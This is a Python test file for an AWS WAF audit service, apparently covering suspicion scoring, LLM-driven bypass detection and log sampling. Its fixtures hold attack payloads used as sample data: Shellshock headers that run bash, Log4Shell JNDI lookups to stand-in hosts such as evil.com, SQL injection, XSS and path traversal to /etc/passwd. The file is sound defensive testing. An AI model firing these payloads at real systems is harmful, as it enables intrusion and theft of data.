"""Phase 5.5 — Bypass-detection (Pass 3).

Coverage:
* aws_waf.score_request_suspicion: heuristic 0..100 score for log events.
* ai_pipeline.detect_bypasses: produces well-shaped bypass_candidate
  findings tagged evidence='log-sample' when given suspicious requests.
* ai_pipeline.run_pipeline: optional suspicious_requests argument wires
  through Pass 3 + merges into findings.
* audit.run_audit_pipeline: when meta.suspicious_requests is populated, the
  resulting bypass_candidate findings persist `evidence='log-sample'` on
  the Mongo document.
"""
from __future__ import annotations

import json
import os
import sys
from pathlib import Path
from typing import Any, Dict, List

import mongomock
import pytest
from fastapi.testclient import TestClient

BACKEND_DIR = Path(__file__).resolve().parent.parent
if str(BACKEND_DIR) not in sys.path:
    sys.path.insert(0, str(BACKEND_DIR))

os.environ["RULEIQ_TESTING"] = "1"
os.environ.setdefault("EXTERNAL_ID_SECRET", "a" * 64)
os.environ.setdefault("DEMO_MODE", "true")

from services import ai_pipeline  # noqa: E402
from services import audit as audit_mod  # noqa: E402
from services import aws_waf  # noqa: E402
from services import db as db_mod  # noqa: E402
import main  # noqa: E402


# ---- 1. Heuristic scoring (Phase 5.5 spec values) --------------------------
#
# Score increments per spec:
#   shellshock=+10  log4shell/jndi=+10  sqli=+8  xss=+6  lfi=+6  cmd=+6
#   admin-path=+4   scanner-UA=+4   SUSPICION_THRESHOLD=4


def test_score_request_suspicion_benign_request_is_zero():
    req = {
        "httpRequest": {
            "uri": "/api/v1/products",
            "args": "page=1",
            "headers": [{"name": "user-agent", "value": "Mozilla/5.0"}],
        }
    }
    assert aws_waf.score_request_suspicion(req) == 0


def test_score_request_suspicion_sqli_query_flagged():
    req = {
        "httpRequest": {
            "uri": "/products",
            "args": "id=1 UNION+SELECT password FROM users",
            "headers": [],
        }
    }
    score = aws_waf.score_request_suspicion(req)
    assert score >= aws_waf._S_SQLI
    assert score >= aws_waf.SUSPICION_THRESHOLD


def test_score_request_suspicion_path_traversal_flagged():
    req = {
        "httpRequest": {
            "uri": "/static/../../etc/passwd",
            "args": "",
            "headers": [],
        }
    }
    # ../ pattern + /etc/passwd substring — LFI scores once (deduped).
    score = aws_waf.score_request_suspicion(req)
    assert score >= aws_waf._S_LFI
    assert score >= aws_waf.SUSPICION_THRESHOLD


def test_score_request_suspicion_shellshock_header_flagged_high():
    req = {
        "httpRequest": {
            "uri": "/cgi-bin/foo.cgi",
            "args": "",
            "headers": [
                {"name": "user-agent", "value": "() { :;}; /bin/bash -c 'id'"}
            ],
        }
    }
    # Shellshock + cgi-bin admin-path + bash -c command injection.
    score = aws_waf.score_request_suspicion(req)
    assert score >= aws_waf._S_SHELLSHOCK
    assert score >= 10


def test_score_request_suspicion_scanner_ua_flagged():
    req = {
        "httpRequest": {
            "uri": "/",
            "args": "",
            "headers": [{"name": "user-agent", "value": "sqlmap/1.5"}],
        }
    }
    assert aws_waf.score_request_suspicion(req) >= aws_waf._S_SCANNER_UA


def test_score_request_suspicion_jndi_in_header():
    req = {
        "httpRequest": {
            "uri": "/api/v1/login",
            "args": "",
            "headers": [
                {"name": "x-api-version", "value": "${jndi:ldap://evil.com/a}"}
            ],
        }
    }
    assert aws_waf.score_request_suspicion(req) >= aws_waf._S_LOG4SHELL


def test_score_request_suspicion_multi_signature_accumulates():
    """Multi-signature attacks accumulate cleanly — no upper cap."""
    req = {
        "httpRequest": {
            "uri": "/admin/../../etc/passwd",
            "args": "x=union+select&y=<script",
            "headers": [
                {"name": "user-agent", "value": "sqlmap"},
                {"name": "x-h", "value": "${jndi:foo}"},
                {"name": "x-h2", "value": "() { :;}; bash -c id"},
            ],
        }
    }
    score = aws_waf.score_request_suspicion(req)
    # Expected: shellshock(10) + jndi(10) + sqli(8) + xss(6) + lfi(6) + cmd(6)
    #          + admin(4) + scanner(4) = 54.
    assert score >= 30, f"multi-signature attack should score very high, got {score}"


# ---- 2. detect_bypasses (Pass 3) -------------------------------------------


def test_detect_bypasses_empty_input_returns_empty(monkeypatch):
    monkeypatch.setattr(
        ai_pipeline,
        "_chat_json",
        lambda *_args, **_kw: pytest.fail("LLM must not be called for empty input"),
    )
    assert ai_pipeline.detect_bypasses([]) == []


def test_detect_bypasses_shapes_findings_correctly(monkeypatch):
    """Pass-3 LLM output is mapped to `bypass_candidate` findings with
    evidence='log-sample' and an example_uri in the description."""

    def fake_chat(system: str, user: str) -> Dict[str, Any]:
        assert "AWS WAF security expert" in system
        assert "requests" in user
        return {
            "gaps": [
                {
                    "pattern_type": "sqli",
                    "severity": "high",
                    "example_uri": "/products?id=1 UNION SELECT password",
                    "recommendation": "Enable AWSManagedRulesSQLiRuleSet on the prod ACL.",
                    "confidence": 0.88,
                },
                {
                    "pattern_type": "shellshock",
                    "severity": "medium",
                    "example_uri": "/cgi-bin/x",
                    "recommendation": "Add a header-match BLOCK rule for '() { :;};'.",
                    "confidence": 0.72,
                },
            ]
        }

    monkeypatch.setattr(ai_pipeline, "_chat_json", fake_chat)
    findings = ai_pipeline.detect_bypasses(
        [{"httpRequest": {"uri": "/products", "args": "", "headers": []}}]
    )
    assert len(findings) == 2
    for f in findings:
        assert f["type"] == "bypass_candidate"
        assert f["evidence"] == "log-sample"
        assert f["severity"] in {"high", "medium", "low"}
        assert "Possible WAF bypass" in f["title"]
        assert f["confidence"] >= 0.0


def test_detect_bypasses_caps_input_at_50(monkeypatch):
    captured = {}

    def fake_chat(system: str, user: str) -> Dict[str, Any]:
        import json

        payload = json.loads(user)
        captured["count"] = len(payload["requests"])
        return {"gaps": []}

    monkeypatch.setattr(ai_pipeline, "_chat_json", fake_chat)
    big = [{"httpRequest": {"uri": f"/x{i}"}} for i in range(120)]
    ai_pipeline.detect_bypasses(big)
    assert captured["count"] == 50


def test_detect_bypasses_invalid_severity_normalised(monkeypatch):
    def fake_chat(*_a, **_kw):
        return {
            "gaps": [
                {
                    "pattern_type": "xss",
                    "severity": "CRITICAL",  # not a valid value
                    "example_uri": "/x",
                    "recommendation": "rule",
                    "confidence": 0.5,
                }
            ]
        }

    monkeypatch.setattr(ai_pipeline, "_chat_json", fake_chat)
    findings = ai_pipeline.detect_bypasses(
        [{"httpRequest": {"uri": "/x", "args": "", "headers": []}}]
    )
    assert findings[0]["severity"] == "low"


# ---- 3. run_pipeline wires Pass 3 in --------------------------------------


def test_run_pipeline_includes_pass3_findings(monkeypatch):
    call_log: List[str] = []

    def fake_chat(system: str, user: str) -> Dict[str, Any]:
        if "AWS WAF security expert" in system and "requests" in user:
            call_log.append("pass3")
            return {
                "gaps": [
                    {
                        "pattern_type": "log4shell",
                        "severity": "high",
                        "example_uri": "/api/foo",
                        "recommendation": "Enable KnownBadInputs.",
                        "confidence": 0.9,
                    }
                ]
            }
        if "WAF security expert" in system:
            call_log.append("pass1")
            return {"explanation": "ok", "working": True, "concerns": None}
        if "WAF security auditor" in system:
            call_log.append("pass2")
            return {"findings": []}
        return {}

    monkeypatch.setattr(ai_pipeline, "_chat_json", fake_chat)
    rules = [
        {
            "rule_name": "X",
            "web_acl_name": "acl",
            "statement_json": {},
            "hit_count": 0,
            "rule_kind": "custom",
        }
    ]
    result = ai_pipeline.run_pipeline(
        rules,
        suspicious_requests=[
            {"httpRequest": {"uri": "/api/foo", "args": "", "headers": []}}
        ],
    )
    assert "pass1" in call_log and "pass2" in call_log and "pass3" in call_log
    bypass = [f for f in result["findings"] if f["type"] == "bypass_candidate"]
    assert bypass, "Pass-3 bypass_candidate not merged into final findings"
    assert bypass[0]["evidence"] == "log-sample"


# ---- 4. End-to-end persistence of evidence='log-sample' --------------------


@pytest.fixture()
def db():
    mock = mongomock.MongoClient()["ruleiq_phase5_bypass"]
    db_mod.set_test_db(mock)
    yield mock
    db_mod.clear_test_db()


@pytest.fixture()
def client(db) -> TestClient:
    return TestClient(main.app)


def test_audit_persists_bypass_finding_with_log_sample_evidence(client, db, monkeypatch):
    """When the loader returns suspicious_requests, the persisted finding must
    carry evidence='log-sample' on the Mongo document."""

    def fake_run_pipeline(rules, suspicious_requests=None):
        return {
            "rules": [{**r, "ai_explanation": {"explanation": "m", "working": True, "concerns": None}} for r in rules],
            "findings": [
                {
                    "type": "bypass_candidate",
                    "severity": "high",
                    "affected_rules": [],
                    "title": "Possible WAF bypass: sqli reached origin",
                    "description": "Example: /x?id=1 union select",
                    "recommendation": "Enable SQLi managed group.",
                    "confidence": 0.85,
                    "evidence": "log-sample",
                }
            ],
        }

    monkeypatch.setattr(audit_mod.ai_pipeline, "run_pipeline", fake_run_pipeline)

    resp = client.post(
        "/api/audits",
        json={"account_id": "111122223333", "region": "us-east-1"},
    )
    audit_id = resp.json()["audit_run_id"]
    audit_mod.run_audit_pipeline(audit_id, db)

    f = db["findings"].find_one(
        {"audit_run_id": audit_id, "type": "bypass_candidate"}
    )
    assert f is not None
    assert f.get("evidence") == "log-sample"
    assert f["severity"] == "high"


# ---- 5. Suspicious-allow sampler (Phase 5.5) -------------------------------


class _FakeCloudWatchLogsClient:
    """Mock boto3 logs client returning pre-canned filter_log_events pages.

    Each call to filter_log_events returns `pages[next_token_or_0]`. nextToken
    chains pages until exhausted. The fake honours the JSON `filterPattern`
    to the extent needed: it only returns events whose parsed message
    matches `$.action = "ALLOW"`.
    """

    def __init__(self, pages: List[List[Dict[str, Any]]]):
        self.pages = pages
        self.calls: List[Dict[str, Any]] = []

    def filter_log_events(self, **kwargs):
        self.calls.append(kwargs)
        token = kwargs.get("nextToken")
        idx = int(token) if token is not None else 0
        if idx >= len(self.pages):
            return {"events": [], "nextToken": None}
        page = self.pages[idx]
        # Server-side ALLOW filter
        pattern = kwargs.get("filterPattern", "")
        filtered = []
        for ev in page:
            try:
                parsed = json.loads(ev.get("message", "{}"))
            except json.JSONDecodeError:
                continue
            if '$.action = "ALLOW"' in pattern and parsed.get("action") != "ALLOW":
                continue
            filtered.append(ev)
        next_idx = idx + 1
        return {
            "events": filtered,
            "nextToken": str(next_idx) if next_idx < len(self.pages) else None,
        }


def _make_event(msg: Dict[str, Any]) -> Dict[str, Any]:
    return {"timestamp": 1700000000000, "message": json.dumps(msg)}


def _allow(uri="/", args="", headers=None) -> Dict[str, Any]:
    return {
        "action": "ALLOW",
        "responseCodeSent": 200,
        "httpRequest": {
            "uri": uri,
            "args": args,
            "headers": headers or [],
            "country": "US",
        },
    }


def _block(uri="/", args="", headers=None) -> Dict[str, Any]:
    return {**_allow(uri, args, headers), "action": "BLOCK"}


LOG_GROUP_ARN = (
    "arn:aws:logs:us-east-1:111122223333:log-group:aws-waf-logs-prod:*"
)


def test_shellshock_in_user_agent_is_top_scored():
    """Spec smoke-test gold case: shellshock UA must be top-scored."""
    events = [
        _make_event(
            _allow(
                uri="/cgi-bin/index.cgi",
                headers=[
                    {
                        "name": "user-agent",
                        "value": '() { :;}; /bin/bash -c "echo hacked"',
                    }
                ],
            )
        ),
        _make_event(_allow(uri="/", headers=[{"name": "user-agent", "value": "Mozilla/5.0"}])),
        _make_event(_allow(uri="/about", headers=[{"name": "user-agent", "value": "Chrome"}])),
    ]
    fake = _FakeCloudWatchLogsClient([events])
    sample = aws_waf.sample_suspicious_allowed_requests(
        session=None, log_group_arn=LOG_GROUP_ARN, top_k=50, logs_client=fake
    )
    assert sample, "expected at least one suspicious request"
    top = sample[0]
    assert top["_suspicion_score"] >= 10
    ua = next(
        (h["value"] for h in top["httpRequest"]["headers"] if h["name"] == "user-agent"),
        "",
    )
    assert "() { :;}" in ua


def test_log4shell_in_header_value_is_top_scored():
    events = [
        _make_event(
            _allow(
                uri="/api/v1/login",
                headers=[
                    {"name": "x-api-version", "value": "${jndi:ldap://attacker.com/x}"}
                ],
            )
        ),
        _make_event(_allow(uri="/home")),
    ]
    fake = _FakeCloudWatchLogsClient([events])
    sample = aws_waf.sample_suspicious_allowed_requests(
        session=None, log_group_arn=LOG_GROUP_ARN, logs_client=fake
    )
    assert sample
    assert sample[0]["_suspicion_score"] >= 10
    headers = sample[0]["httpRequest"]["headers"]
    assert any("${jndi:" in (h.get("value") or "") for h in headers)


def test_benign_requests_filtered_out():
    """100 boring GETs → all score 0 → none retained (threshold 4)."""
    events = []
    for i in range(100):
        events.append(_make_event(_allow(uri=f"/path/{i}", args=f"page={i}")))
    fake = _FakeCloudWatchLogsClient([events])
    sample = aws_waf.sample_suspicious_allowed_requests(
        session=None, log_group_arn=LOG_GROUP_ARN, top_k=50, logs_client=fake
    )
    assert sample == []


def test_blocked_requests_not_sampled():
    """BLOCK events must not appear in suspicious sample (defence-in-depth
    against logs that slip past the filterPattern)."""
    events = [
        _make_event(
            _block(
                uri="/cgi-bin/x",
                headers=[
                    {"name": "user-agent", "value": "() { :;}; /bin/bash -c 'id'"}
                ],
            )
        ),
        _make_event(_block(uri="/admin", args="x=union+select")),
    ]
    fake = _FakeCloudWatchLogsClient([events])
    sample = aws_waf.sample_suspicious_allowed_requests(
        session=None, log_group_arn=LOG_GROUP_ARN, logs_client=fake
    )
    assert sample == [], "BLOCK events must not appear in ALLOW-sample"


def test_top_k_across_all_rules_caps_at_50():
    """60 high-scoring events spread across 3 pages → exactly 50 retained."""
    pages: List[List[Dict[str, Any]]] = []
    for page_idx in range(3):
        page = []
        for i in range(20):
            page.append(
                _make_event(
                    _allow(
                        uri=f"/admin/p{page_idx}_{i}",  # +4 admin
                        args="id=1 UNION+SELECT password",  # +8 sqli
                    )
                )
            )
        pages.append(page)
    fake = _FakeCloudWatchLogsClient(pages)
    sample = aws_waf.sample_suspicious_allowed_requests(
        session=None, log_group_arn=LOG_GROUP_ARN, top_k=50, logs_client=fake
    )
    assert len(sample) == 50, f"expected exactly 50, got {len(sample)}"
    assert all(s["_suspicion_score"] >= 12 for s in sample), (
        "every retained sample is admin+sqli (score >= 12)"
    )


def test_sample_then_pass3_produces_bypass_findings(monkeypatch):
    """Integration: real sampler → real merge → mocked Pass 3 → mapped to
    bypass_candidate findings tagged evidence='log-sample'."""
    events = [
        # 5 attack-shaped ALLOWs (will all clear threshold=4)
        _make_event(
            _allow(
                uri="/cgi-bin/x",
                headers=[
                    {"name": "user-agent", "value": "() { :;}; /bin/bash"}
                ],
            )
        ),
        _make_event(
            _allow(
                uri="/api/login",
                headers=[{"name": "x-h", "value": "${jndi:ldap://e/x}"}],
            )
        ),
        _make_event(_allow(uri="/items", args="id=1 UNION+SELECT pwd")),
        _make_event(_allow(uri="/q", args="x=<script>alert(1)</script>")),
        _make_event(_allow(uri="/static/../../etc/passwd")),
        # 5 benign requests — must be filtered out by threshold
        _make_event(_allow(uri="/")),
        _make_event(_allow(uri="/about")),
        _make_event(_allow(uri="/api/health")),
        _make_event(_allow(uri="/static/js/app.js")),
        _make_event(_allow(uri="/favicon.ico")),
    ]
    fake = _FakeCloudWatchLogsClient([events])

    # Step 1: sampler returns all 5 attack-shaped, none of the benign.
    sample = aws_waf.sample_suspicious_allowed_requests(
        session=None, log_group_arn=LOG_GROUP_ARN, top_k=50, logs_client=fake
    )
    assert len(sample) == 5
    for ev in sample:
        assert ev["action"] == "ALLOW"
        assert ev["_suspicion_score"] >= aws_waf.SUSPICION_THRESHOLD

    # Step 2: feed sample through Pass 3 (LLM mocked).
    def fake_chat(system, user):
        # Verify the sample reached the prompt.
        assert "log4shell" in user.lower() or "jndi" in user.lower() or "/cgi-bin" in user.lower() or "union+select" in user.lower()
        return {
            "gaps": [
                {
                    "pattern_type": "shellshock",
                    "severity": "high",
                    "example_uri": "/cgi-bin/x",
                    "recommendation": "Block UA pattern () { :;};",
                    "confidence": 0.95,
                },
                {
                    "pattern_type": "log4shell",
                    "severity": "high",
                    "example_uri": "/api/login",
                    "recommendation": "Enable AWSManagedRulesKnownBadInputsRuleSet.",
                    "confidence": 0.9,
                },
            ]
        }

    monkeypatch.setattr(ai_pipeline, "_chat_json", fake_chat)
    findings = ai_pipeline.detect_bypasses(sample)
    assert len(findings) == 2
    for f in findings:
        assert f["type"] == "bypass_candidate"
        assert f["evidence"] == "log-sample"


def test_merge_suspicious_samples_global_top_k():
    """merge_suspicious_samples combines per-ACL lists into one global top-K
    ranked by _suspicion_score regardless of which ACL produced each event."""
    acl_a = [
        {"_suspicion_score": 30, "httpRequest": {"uri": "/a30"}},
        {"_suspicion_score": 10, "httpRequest": {"uri": "/a10"}},
    ]
    acl_b = [
        {"_suspicion_score": 25, "httpRequest": {"uri": "/b25"}},
        {"_suspicion_score": 8, "httpRequest": {"uri": "/b8"}},
        {"_suspicion_score": 50, "httpRequest": {"uri": "/b50"}},
    ]
    merged = aws_waf.merge_suspicious_samples([acl_a, acl_b], top_k=3)
    assert [m["_suspicion_score"] for m in merged] == [50, 30, 25]
    assert merged[0]["httpRequest"]["uri"] == "/b50"


def test_sample_empty_logs_returns_empty():
    """Spec § 6: 'Guard against empty input.'"""
    fake = _FakeCloudWatchLogsClient([])
    sample = aws_waf.sample_suspicious_allowed_requests(
        session=None, log_group_arn=LOG_GROUP_ARN, logs_client=fake
    )
    assert sample == []
